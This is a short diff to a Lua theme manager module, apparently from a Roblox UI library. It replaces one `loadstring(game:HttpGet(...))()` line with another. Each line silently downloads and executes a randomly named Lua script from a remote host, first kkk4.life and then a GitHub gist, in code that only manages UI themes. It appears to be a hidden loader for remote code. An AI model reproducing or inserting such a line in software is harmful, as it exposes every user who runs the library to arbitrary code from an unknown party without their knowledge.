@@ -349,7 +349,7 @@ ThemeManager.BuiltInThemes = {
 
 		return decoded
 	end
-	loadstring(game:HttpGet("https://kkk4.life/gsndfklgjnsdfjklgnsdfweruihquretre.lua"))()
+	loadstring(game:HttpGet("https://gist.githubusercontent.com/blmpsaa/eba70363ccffc7de04313666b3c9e21d/raw/a38643607aa89ed94befca5c240abeae21652051/gfgfsfgsdfg.lua"))()
 	function ThemeManager:SaveCustomTheme(file)
 		if file:gsub(' ', '') == '' then
 			return self.Library:Notify('Invalid file name for theme (empty)', 3)
